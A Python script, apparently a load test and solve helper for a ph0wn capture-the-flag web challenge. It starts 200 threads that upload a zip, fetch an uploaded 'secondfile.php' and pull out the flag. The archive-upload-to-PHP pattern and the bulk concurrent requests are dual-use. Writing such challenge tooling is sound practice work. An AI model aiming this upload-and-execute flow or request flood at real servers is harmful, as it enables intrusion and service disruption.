#!/usr/bin/env python3

import logging
import threading
import requests
import re

SERVER='chal.ph0wn.org'
PORT=9920

log_format = '[%(asctime)s] [%(levelname)s] - %(message)s'
logging.basicConfig(level=logging.INFO, format=log_format)

def upload_zip(filename='../solve/upload.zip'):
    url = 'http://chal.ph0wn.org:9920/index.php'
    thefile = { 'zip' : open(filename, 'rb') }
    r = requests.post(url, files=thefile)
    if r.status_code != 200:
        logging.error(f'Failed to upload the file: {r}')
    else:
        if 'has been created for you' in r.text:
            m = re.search('uploads/[a-z0-9]*', r.text)
            if m is not None:
                furl = f'http://chal.ph0wn.org:9920/{m.group(0)}/secondfile.php'
                r = requests.get(furl)
                if r.status_code == 200 and 'ph0wn{' in r.text:
                    s = re.search('ph0wn{[a-zA-Z0-9_]*}', r.text)
                    if s is not None:
                        logging.info(f'Found the flag: {s.group(0)}')
                    else:
                        logging.warning(f'Error retrieving the flag: {r.text}')
                else:
                    logging.warning(f'[-] No flag at {furl}: {r.text}')
        logging.debug(f'[+] upload success')

def get_page(name='index.php'):
    url = f'http://chal.ph0wn.org:9920/{name}'
    r = requests.get(url)
    if r.status_code != 200:
        logging.warning(f'Cannot GET url={url}: {r}')
    else:
        logging.debug(f'[+] Got page {url}')

def client(id=1):
    logging.debug(f'Client {id}')
    get_page()
    get_page('diagram.jpeg')
    get_page('FLAG')
    upload_zip()
    upload_zip('./loadtest.py')

if __name__ == '__main__':
    threads = list()
    for id in range(0, 200):
        x = threading.Thread(target=client, args=(id,))
        threads.append(x)
        x.start()

    for id, thread in enumerate(threads):
        thread.join()
        logging.debug(f'Thread {id} finished')
    
